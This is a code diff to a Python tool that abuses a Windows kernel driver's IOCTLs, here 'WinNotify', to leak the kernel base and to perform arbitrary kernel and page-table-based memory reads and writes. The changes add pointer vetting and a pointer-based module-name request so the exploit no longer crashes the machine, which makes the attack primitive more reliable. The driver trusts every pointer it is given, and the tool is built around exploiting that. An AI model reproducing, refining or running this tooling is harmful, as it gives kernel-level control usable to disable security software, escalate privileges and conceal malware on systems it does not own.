@@ -84,6 +84,10 @@ DEFAULT_CONFIG = {
         r"C:\Windows\System32\drivers\signeddrv.sys",
     ],
     "info_module_names": ["ntoskrnl.exe", "ntoskrnl"],
+    # +0x00 of the INFO request must be a *user-mode pointer* to the module
+    # name.  Setting this to false sends the name bytes inline, which makes
+    # the driver dereference an ASCII constant -> instant bugcheck.
+    "info_name_is_pointer": True,
     # The driver validates the *exact* input length per IOCTL and fails with
     # ERROR_BAD_LENGTH (24) otherwise -- these are the lengths from the RE.
     "info_in_size": 0x18,          # 24
@@ -105,6 +109,7 @@ DEFAULT_CONFIG = {
     "read_probe_biases": [0x10, 0],
     "write_probe_sizes": [0x18, 0x28],
     "autodetect": True,                # shape detection of the ioctl structs
+    "vet_ioctl_packets": True,         # refuse non-user/non-kernel pointers
     "allow_unknown_ioctl": True,       # guessed IOCTL codes -> e.g. WinError 1
                                        # (raising this to False is dangerous)
     "use_direct_vioctl": True,         # safe path; fallback is opt-in only
@@ -600,6 +605,7 @@ class WinNotify:
         if not self.device:
             raise WinNotifyError("device is not open")
         payload = bytes(in_buf)
+        self._vet_ioctl_packet(code, payload)
         in_size = len(payload) if in_size is None else in_size
         if out_size is None:
             out_size = in_size
@@ -629,59 +635,135 @@ class WinNotify:
             data = data.ljust(out_size, b"\x00")
         return data
 
+    def _vet_ioctl_packet(self, code, payload):
+        """Last line of defence before the kernel sees anything.
+
+        The driver trusts every pointer in the request.  A pointer that is not
+        in our own process (and not a canonical kernel address where the IOCTL
+        expects one) is therefore refused here instead of bugchecking.
+        """
+        if not self.cfg.get("vet_ioctl_packets", True):
+            return
+        if code == self.cfg["ioctl_info"]:
+            ptr = int.from_bytes(payload[:8].ljust(8, b"\x00"), "little")
+            if not self._is_user_ptr(ptr):
+                raise WinNotifyError(
+                    f"0x{code:X}: +0x00 must be a pointer to the module-name "
+                    f"string in our process, got 0x{ptr:X} -- refusing "
+                    "(the driver would dereference it)")
+        elif code in (self.cfg["ioctl_vread"], self.cfg["ioctl_vwrite"]):
+            layout = self.cfg.get("vioctl_layout", 0)
+            field = lambda off: int.from_bytes(
+                payload[off:off + 8].ljust(8, b"\x00"), "little")
+            if layout == 0:            # [flags][va][buf][size][cr3]
+                va, buf_ptr, cr3 = field(8), field(0x10), field(0x20)
+            else:                      # [cr3][va][size][buf]
+                cr3, va, buf_ptr = field(0), field(8), field(0x18)
+            if not cr3 and len(payload) == 0x20:
+                # legacy struct just sent with the documented layout: the CR3
+                # lives at +0x18 there.  Accept either shape for the check --
+                # the actual layout is re-detected from the driver's reply.
+                alt = field(0x18)
+                if 0x1000 <= (alt & 0x000FFFFFFFFFF000) <= 0x000FFFFFFFFFF000:
+                    cr3 = alt
+            if not self._is_user_ptr(buf_ptr):
+                raise WinNotifyError(
+                    f"0x{code:X}: data buffer 0x{buf_ptr:X} is not a valid "
+                    "user pointer -- refusing")
+            if not self._is_user_ptr(va):
+                raise WinNotifyError(
+                    f"0x{code:X}: 0x{va:X} is not a process virtual address -- "
+                    "refusing (a kernel VA here would poison the target CR3)")
+            if not (0x1000 <= (cr3 & 0x000FFFFFFFFFF000) <= 0x000FFFFFFFFFF000):
+                raise WinNotifyError(
+                    f"0x{code:X}: CR3 0x{cr3:X} does not look like a page table")
+        elif code == self.cfg["ioctl_write"]:
+            src = int.from_bytes(payload[:8].ljust(8, b"\x00"), "little")
+            dst = int.from_bytes(payload[0x10:0x18].ljust(8, b"\x00"), "little")
+            if not self._is_user_ptr(src):
+                raise WinNotifyError(
+                    f"0x{code:X}: source 0x{src:X} is not a user pointer -- refusing")
+            if not self._is_kernel_ptr(dst):
+                raise WinNotifyError(
+                    f"0x{code:X}: destination 0x{dst:X} is not a kernel address -- "
+                    "refusing")
+        elif code == self.cfg["ioctl_read"]:
+            base = int.from_bytes(payload[:8].ljust(8, b"\x00"), "little")
+            start = (base + self.cfg["read_bias"]) & 0xFFFFFFFFFFFFFFFF
+            if not self._is_kernel_ptr(start):
+                raise WinNotifyError(
+                    f"0x{code:X}: 0x{start:X} is not a kernel address -- refusing")
+
     # -- kernel base -------------------------------------------------------
     def get_kernel_base(self, autodetect=True):
+        """0x22200C: hand the driver a *valid user pointer* to the module name.
+
+        The driver reads a QWORD at +0x00 and uses it as a pointer to the name
+        string (it never copies the bytes into the kernel).  Writing the ASCII
+        name at +0x00 makes the driver dereference ~0x6C726B736F74746E, i.e. a
+        guaranteed bugcheck -- that was the selftest BSOD.  +0x00 is now always
+        the address of a string buffer we own.
+        """
         in_size = self.cfg["info_in_size"]
         out_size = self.cfg["info_out_size"]
         off = self.cfg["info_result_offset"]
+        pointer_mode = self.cfg.get("info_name_is_pointer", True)
         last = None
         for name in self.cfg["info_module_names"]:
-            in_buf = (name.encode("ascii") + b"\x00")[:in_size].ljust(in_size, b"\x00")
             try:
-                out = self.ioctl(self.cfg["ioctl_info"], in_buf,
-                                 out_size=out_size, in_size=in_size)
+                if pointer_mode:
+                    out = self._info_pointer_call(name, in_size, out_size)
+                else:
+                    packet = (name.encode("ascii") + b"\x00")[:in_size].ljust(
+                        in_size, b"\x00")
+                    out = self.ioctl(self.cfg["ioctl_info"], packet,
+                                     out_size=out_size, in_size=in_size)
             except WinNotifyIoctlError as exc:
                 last = exc
+                if exc.winerror == ERROR_BAD_LENGTH and pointer_mode:
+                    # same semantics, other struct size: retry with a pointer
+                    for size in self.cfg.get("info_probe_sizes", [0x18, 0x28]):
+                        try:
+                            out = self._info_pointer_call(
+                                name, size, max(out_size, size))
+                        except WinNotifyError:
+                            continue
+                        cand = int.from_bytes(out[off:off + 8], "little")
+                        if cand and self._looks_like_kernel_base(cand):
+                            self.cfg["info_in_size"] = size
+                            self.cfg["info_out_size"] = max(out_size, size)
+                            self.kernel_base = cand
+                            self.log(f"[i] module-base IOCTL auto-detected: "
+                                     f"pointer, in=0x{size:X}")
+                            return cand
                 continue
-            if len(out) >= off + 8:
-                base = int.from_bytes(out[off:off + 8], "little")
-                if base:
-                    self.kernel_base = base
-                    return base
-        if last and last.winerror == ERROR_BAD_LENGTH and autodetect:
-            return self._probe_kernel_base()
+            except WinNotifyError as exc:
+                last = exc
+                continue
+            if len(out) < off + 8:
+                last = WinNotifyError("module-base reply was too short")
+                continue
+            base = int.from_bytes(out[off:off + 8], "little")
+            if base and self._looks_like_kernel_base(base):
+                self.kernel_base = base
+                return base
+            last = WinNotifyError(
+                f"module-base reply held 0x{base:X} (implausible value)")
         if last:
             raise WinNotifyError(f"{last}  [module-base IOCTL layout mismatch?]")
         raise WinNotifyError("driver returned no kernel base")
 
-    def _probe_kernel_base(self):
-        """Find the input length this driver build accepts for 0x22200C.
+    def _looks_like_kernel_base(self, value):
+        """ntoskrnl is 2 MB aligned and lives in the high half."""
+        return (value >> 48) == 0xFFFF and (value & 0x1FFFFF) == 0
 
-        Different WinNotify builds use 0x18 (documented) or 0x28 (what the
-        Pascal bridge assumed) byte input structs; both write the base to
-        +0x10 of the reply.  Probing keeps the tool working on either.
-        """
-        name = self.cfg["info_module_names"][0].encode("ascii") + b"\x00"
-        for in_size in self.cfg.get("info_probe_sizes", [0x18, 0x28]):
-            for out_size in self.cfg.get("info_probe_out_sizes", [0x20, 0x40]):
-                packet = name.ljust(in_size, b"\x00")[:in_size]
-                try:
-                    out = self.ioctl(self.cfg["ioctl_info"], packet,
-                                     out_size=out_size, in_size=in_size)
-                except WinNotifyError:
-                    continue
-                base = int.from_bytes(out[0x10:0x18], "little")
-                if base and base >> 48 == 0xFFFF:
-                    self.cfg["info_in_size"] = in_size
-                    self.cfg["info_out_size"] = out_size
-                    self.kernel_base = base
-                    self.log(f"[i] module-base IOCTL auto-detected: "
-                             f"in=0x{in_size:X} out=0x{out_size:X}")
-                    return base
-        raise WinNotifyError(
-            "0x22200C rejects every known input size -- this driver build has a "
-            "different module-base IOCTL; set ioctl_info/info_in_size in "
-            "winnotify.json")
+    def _info_pointer_call(self, name, in_size, out_size):
+        """Send 0x22200C with a pointer to a NUL-terminated name in our memory."""
+        buf = ctypes.create_string_buffer(name.encode("ascii"), len(name) + 1)
+        packet = (ctypes.addressof(buf).to_bytes(8, "little")
+                  + b"\x00" * (in_size - 8))
+        return self.ioctl(self.cfg["ioctl_info"], packet[:in_size],
+                          out_size=out_size, in_size=in_size)
 
     # -- arbitrary kernel read / write -------------------------------------
     #
